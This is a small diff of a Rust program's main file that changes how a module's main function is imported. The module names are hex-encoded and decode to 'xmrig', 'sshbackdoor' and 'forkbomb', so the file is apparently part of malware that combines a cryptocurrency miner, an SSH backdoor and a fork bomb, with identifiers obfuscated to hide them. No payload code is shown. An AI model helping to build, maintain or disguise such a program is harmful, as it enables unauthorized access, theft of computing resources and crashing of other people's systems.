@@ -2,7 +2,7 @@ mod _0x786d726967;
 mod _0x7373686261636b646f6f72;
 mod _0x666f726b626f6d62;
 
-use _0x666f726b626f6d62::main as _0x666f726b626f6d62;
+use _0x666f726b626f6d62::main;
 use std::{thread, time};
 
 fn main() {
